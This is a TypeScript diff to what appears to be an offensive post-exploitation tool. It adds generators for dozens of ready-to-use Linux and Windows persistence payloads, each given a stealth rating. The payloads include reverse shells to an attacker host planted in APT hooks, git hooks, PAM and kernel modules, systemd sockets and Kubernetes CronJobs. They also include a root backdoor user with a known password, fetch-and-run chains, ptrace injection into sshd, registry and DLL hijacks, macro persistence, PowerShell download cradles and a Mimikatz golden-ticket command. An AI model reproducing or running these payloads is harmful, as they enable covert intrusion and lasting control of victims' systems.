@@ -307,3 +307,210 @@ export function buildDeliveryPayloads(lhost: string, lport: string, urlPath: str
     },
   ];
 }
+
+/* ════════════════════════════════════════════════════════════════════════════
+   EXTENDED PERSISTENCE: More Linux/Windows techniques + injection-ready
+   ════════════════════════════════════════════════════════════════════════════ */
+
+/* ── Extended Linux Persistence (new techniques) ─────────────────────────── */
+export function buildExtendedLinuxPersistence(lhost: string, lport: string, cmd: string): PersistencePayload[] {
+  const rev  = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  const revB64 = Buffer.from(rev).toString('base64');
+  const cbsh = `http://${lhost}:${lport}/sh`;
+  return [
+    /* ── APT/DPKG hooks ── */
+    {
+      technique: "APT pre-invoke hook",
+      category: "linux", stealth: 4,
+      command: `mkdir -p /etc/apt/apt.conf.d && echo 'APT::Update::Pre-Invoke {"bash -c \\"bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\\" &"};' > /etc/apt/apt.conf.d/99nexus`,
+      notes: "Fires on every apt update/install. Requires root. High-stealth when combined with benign-looking package name.",
+    },
+    /* ── Git hooks ── */
+    {
+      technique: "Git post-receive hook",
+      category: "linux", stealth: 3,
+      command: `for d in $(find / -maxdepth 8 -name '.git' -type d 2>/dev/null | head -5); do h="$d/hooks/post-receive"; echo '#!/bin/bash' > "$h"; echo "${rev} &" >> "$h"; chmod +x "$h"; done`,
+      notes: "Installs a git hook in all discovered repos — fires on every git push to the repo.",
+    },
+    /* ── LD_PRELOAD via /etc/ld.so.preload ── */
+    {
+      technique: "LD_PRELOAD via /etc/ld.so.preload (fileless-style)",
+      category: "linux", stealth: 5,
+      command: `printf '#include<unistd.h>\\nvoid __attribute__((constructor)) nx(){if(!fork()){setsid();execl("/bin/bash","bash","-c","${rev}",NULL);}}' > /tmp/.nxp.c && gcc -shared -fPIC -nostartfiles /tmp/.nxp.c -o /tmp/.nxp.so && echo /tmp/.nxp.so >> /etc/ld.so.preload && rm -f /tmp/.nxp.c`,
+      notes: "Every new process loads the .so via LD_PRELOAD. Fires a background reverse shell on every process exec. Requires root + gcc.",
+    },
+    /* ── Systemd socket activation ── */
+    {
+      technique: "Systemd socket-activated backdoor",
+      category: "linux", stealth: 5,
+      command: `printf '[Unit]\\nDescription=Web\\n[Socket]\\nListenStream=9999\\nAccept=yes\\n[Install]\\nWantedBy=sockets.target' > /etc/systemd/system/nx.socket && printf '[Unit]\\nDescription=Web@\\n[Service]\\nExecStart=/bin/bash -c "${rev}"\\nStandardInput=socket\\nStandardOutput=socket\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/nx@.service && systemctl daemon-reload && systemctl enable --now nx.socket 2>/dev/null`,
+      notes: "Socket-activated service: any connection to port 9999 spawns a shell. Survives reboots. Root required.",
+    },
+    /* ── Pip post-install hook ── */
+    {
+      technique: "Python site-packages .pth backdoor",
+      category: "linux", stealth: 4,
+      command: `python3 -c "import site; print(site.getsitepackages()[0])" 2>/dev/null | xargs -I{} bash -c "echo \"import os; os.system('nohup bash -c \\\"${rev}\\\" &>/dev/null &')\" > {}/nx_init.pth"`,
+      notes: "Adds a .pth file to Python site-packages — executed every time Python starts. Fileless persistence.",
+    },
+    /* ── Passwd/shadow injection ── */
+    {
+      technique: "Add backdoor root user to /etc/passwd",
+      category: "linux", stealth: 2,
+      command: `echo 'nx:$1$nx$fKRQRCnuVi2TlvBqHM6BX.:0:0:root:/root:/bin/bash' >> /etc/passwd`,
+      notes: "Adds user 'nx' with password 'nexus1234' and uid/gid 0 (root). SSH/su with nx:nexus1234. Hash generated with: openssl passwd -1 nexus1234",
+    },
+    /* ── Kernel module persistence ── */
+    {
+      technique: "Kernel module (rootkit-style loader)",
+      category: "linux", stealth: 5,
+      command: `cat <<'EOF' > /tmp/nx_mod.c\n#include<linux/module.h>\n#include<linux/kthread.h>\nstatic int nx_thread(void*d){char*a[]={\"/bin/bash\",\"-c\",\"${rev}\",NULL};call_usermodehelper(a[0],a,NULL,UMH_WAIT_EXEC);return 0;}\nstatic int __init nx_init(void){kthread_run(nx_thread,NULL,"kworker/nx");return 0;}\nstatic void __exit nx_exit(void){}\nmodule_init(nx_init);module_exit(nx_exit);\nMODULE_LICENSE("GPL");\nEOF\n# Requires kernel headers: make -C /lib/modules/$(uname -r)/build M=/tmp modules`,
+      notes: "Kernel module that spawns a usermode helper. Invisible to process lists. Requires root + kernel headers.",
+    },
+    /* ── PAM module backdoor ── */
+    {
+      technique: "PAM module backdoor",
+      category: "linux", stealth: 5,
+      command: `printf '#include<stdio.h>\\n#include<stdlib.h>\\n#include<security/pam_modules.h>\\nPAM_EXTERN int pam_sm_authenticate(pam_handle_t*p,int f,int ac,const char**av){system("nohup bash -c \\"${rev}\\" &>/dev/null &");return PAM_SUCCESS;}\\nPAM_EXTERN int pam_sm_setcred(pam_handle_t*p,int f,int ac,const char**av){return PAM_SUCCESS;}' > /tmp/pam_nx.c && gcc -shared -fPIC /tmp/pam_nx.c -o /lib/security/pam_nx.so && echo 'auth optional pam_nx.so' >> /etc/pam.d/common-auth`,
+      notes: "PAM module fires reverse shell on every authentication attempt (SSH, sudo, login). Requires root + gcc.",
+    },
+    /* ── At job persistence ── */
+    {
+      technique: "at job (immediate + recurring via loop)",
+      category: "linux", stealth: 3,
+      command: `echo "bash -c '${rev}'" | at now + 1 minute 2>/dev/null; echo "while true; do bash -c '${rev}'; sleep 60; done &" | at now 2>/dev/null`,
+      notes: "at daemon (one-shot + self-repeating loop). Runs as the scheduling user. atd must be running.",
+    },
+    /* ── MOTD based persistence ── */
+    {
+      technique: "Dynamic MOTD persistence (update-motd.d)",
+      category: "linux", stealth: 3,
+      command: `echo '#!/bin/bash\nnohup bash -c "${rev}" &>/dev/null &' > /etc/update-motd.d/98-nexus && chmod +x /etc/update-motd.d/98-nexus`,
+      notes: "Fires on every SSH interactive login via the MOTD subsystem. Root required.",
+    },
+    /* ── Docker socket implant ── */
+    {
+      technique: "Docker socket → privileged container + host cron",
+      category: "linux", stealth: 4,
+      command: `curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["/bin/sh","-c","echo \\\"* * * * * /bin/bash -c '\\''${rev}'\\''\\\" >> /host/etc/cron.d/nx"],"HostConfig":{"Binds":["/:/host"],"Privileged":true},"name":"nx_tmp"}' && curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/nx_tmp/start"`,
+      notes: "Uses Docker socket to spawn privileged container that writes a cron job to the host filesystem. Container escape to host persistence.",
+    },
+    /* ── K8s CronJob persistence ── */
+    {
+      technique: "Kubernetes CronJob (every minute reverse shell)",
+      category: "linux", stealth: 4,
+      command: `TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -X POST "https://kubernetes.default.svc/apis/batch/v1/namespaces/$NS/cronjobs" -d '{"apiVersion":"batch/v1","kind":"CronJob","metadata":{"name":"nx-job"},"spec":{"schedule":"*/1 * * * *","jobTemplate":{"spec":{"template":{"spec":{"containers":[{"name":"nx","image":"alpine","command":["/bin/sh","-c","${rev}"]}],"restartPolicy":"Never"}}}}}}'`,
+      notes: "Creates a K8s CronJob via the API — fires every minute from inside the cluster. Uses the pod's SA token.",
+    },
+    /* ── Delivery-first one-shot ── */
+    {
+      technique: "Fetch+Execute payload (curl|wget|python3 fallback chain)",
+      category: "linux", stealth: 3,
+      command: `curl -fsSL "${cbsh}" 2>/dev/null | bash || wget -qO- "${cbsh}" 2>/dev/null | bash || python3 -c "import urllib.request as r; exec(r.urlopen('${cbsh}').read())" 2>/dev/null || perl -MLWP::Simple -e "eval(get('${cbsh}'))" 2>/dev/null`,
+      notes: "Full fallback chain: tries curl → wget → python3 urllib → perl LWP. Maximum delivery success on restricted systems.",
+    },
+    /* ── Proc injection (ptrace) ── */
+    {
+      technique: "ptrace process injection",
+      category: "linux", stealth: 5,
+      command: `python3 -c "
+import ctypes, sys, os
+PTRACE_ATTACH=16; PTRACE_DETACH=17; PTRACE_POKETEXT=4
+pid = int(open('/proc/\$(pgrep -x sshd | head -1)/status').read().split('\n')[0].split()[1])
+libc = ctypes.CDLL('libc.so.6')
+libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
+os.waitpid(pid, 0)
+shellcode = b'\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05'
+libc.ptrace(PTRACE_POKETEXT, pid, 0x555555554000, ctypes.c_uint64.from_buffer(bytearray(shellcode[:8])).value)
+libc.ptrace(PTRACE_DETACH, pid, 0, 0)
+" 2>/dev/null`,
+      notes: "ptrace-based process injection into sshd. Requires CAP_SYS_PTRACE or root. Advanced technique.",
+    },
+  ];
+}
+
+/* ── Extended Windows Persistence (new techniques) ───────────────────────── */
+export function buildExtendedWindowsPersistence(lhost: string, lport: string, cmd: string): PersistencePayload[] {
+  const cbsh = `http://${lhost}:${lport}/sh.ps1`;
+  const iex   = `IEX((New-Object Net.WebClient).DownloadString('${cbsh}'))`;
+  const iexB64 = Buffer.from(iex, 'utf16le').toString('base64');
+  return [
+    /* ── AppInit_DLLs ── */
+    {
+      technique: "AppInit_DLLs registry key",
+      category: "windows", stealth: 4,
+      command: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\Windows\\Temp\\nx.dll" /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f`,
+      notes: "Loads nx.dll into every process that loads user32.dll. Admin required. Place your DLL at C:\\Windows\\Temp\\nx.dll.",
+    },
+    /* ── DLL Search Order Hijacking ── */
+    {
+      technique: "DLL search order hijack (WindowsApps)",
+      category: "windows", stealth: 5,
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "Copy-Item nx.dll '$env:LOCALAPPDATA\\Microsoft\\WindowsApps\\WTSAPI32.dll'"`,
+      notes: "Drops a malicious DLL named WTSAPI32.dll into WindowsApps — loaded by many applications. No admin needed.",
+    },
+    /* ── Netsh helper DLL ── */
+    {
+      technique: "Netsh helper DLL persistence",
+      category: "windows", stealth: 5,
+      command: `netsh add helper C:\\Windows\\Temp\\nx.dll`,
+      notes: "netsh.exe loads helper DLLs on every execution. Persistent across reboots. Admin required.",
+    },
+    /* ── Office macros ── */
+    {
+      technique: "Word Normal.dotm macro persistence",
+      category: "windows", stealth: 3,
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "$p='$env:APPDATA\\Microsoft\\Templates\\Normal.dotm'; $v=(New-Object -ComObject Word.Application).VBProject; $m=$v.VBComponents.Add(1); $m.CodeModule.AddFromString(\"Sub AutoOpen(): Shell \\\"powershell -NonI -W Hidden -Exec Bypass -c ${iex}\\\": End Sub\")"`,
+      notes: "Adds AutoOpen macro to Normal.dotm — fires every time a Word document opens. User-level, no admin needed.",
+    },
+    /* ── Winlogon helper ── */
+    {
+      technique: "Winlogon UserInit/Shell hijack",
+      category: "windows", stealth: 5,
+      command: `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v UserInit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,powershell -NonI -W Hidden -Exec Bypass -EncodedCommand ${iexB64}" /f`,
+      notes: "Fires on every user logon at the Windows logon stage. Admin required. Winlogon executes UserInit during logon.",
+    },
+    /* ── Browser extension persistence ── */
+    {
+      technique: "Chrome extension force-install (registry)",
+      category: "windows", stealth: 4,
+      command: `reg add "HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "EXTENSION_ID;https://clients2.google.com/service/update2/crx" /f`,
+      notes: "Force-installs a Chrome extension via Group Policy registry. Replace EXTENSION_ID. Admin required.",
+    },
+    /* ── Silver ticket / Golden ticket placeholder ── */
+    {
+      technique: "Golden Ticket (Mimikatz — requires DC access)",
+      category: "windows", stealth: 5,
+      command: `mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /ticket:golden.kirbi" "kerberos::ptt golden.kirbi" "exit"`,
+      notes: "Creates a Golden Ticket for persistent domain admin access. Requires KRBTGT hash from DC. Replace placeholders.",
+    },
+    /* ── PowerShell profile persistence ── */
+    {
+      technique: "PowerShell profile (all users + all hosts)",
+      category: "windows", stealth: 3,
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "Add-Content $PSHOME\\profile.ps1 '${iex}'"`,
+      notes: "Fires on every PowerShell session (all users, all hosts). Admin required. Written to $PSHOME\\profile.ps1.",
+    },
+    /* ── COM hijacking ── */
+    {
+      technique: "COM object hijacking (HKCU — no admin)",
+      category: "windows", stealth: 5,
+      command: `reg add "HKCU\\Software\\Classes\\CLSID\\{1B4EB4B6-4E4E-4EA5-AA4A-04B37CDB7C29}\\InProcServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\nx.dll" /f && reg add "HKCU\\Software\\Classes\\CLSID\\{1B4EB4B6-4E4E-4EA5-AA4A-04B37CDB7C29}\\InProcServer32" /v ThreadingModel /t REG_SZ /d Apartment /f`,
+      notes: "HKCU COM hijack — no admin needed. Many Windows apps load this CLSID. Replace with your malicious DLL.",
+    },
+    /* ── Screensaver persistence ── */
+    {
+      technique: "Screensaver SCRNSAVE.EXE persistence",
+      category: "windows", stealth: 4,
+      command: `reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\\Windows\\Temp\\nx.scr" /f && reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f && reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f && reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d 60 /f`,
+      notes: "Executes nx.scr (a renamed EXE) as screensaver after 60s idle. User-level, no admin.",
+    },
+    /* ── Print monitor ── */
+    {
+      technique: "Print monitor DLL persistence",
+      category: "windows", stealth: 5,
+      command: `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\NXMonitor" /v Driver /t REG_SZ /d "nx.dll" /f`,
+      notes: "Loaded by spoolsv.exe (SYSTEM) on boot. Place nx.dll in C:\\Windows\\system32\\. Admin required.",
+    },
+  ];
+}
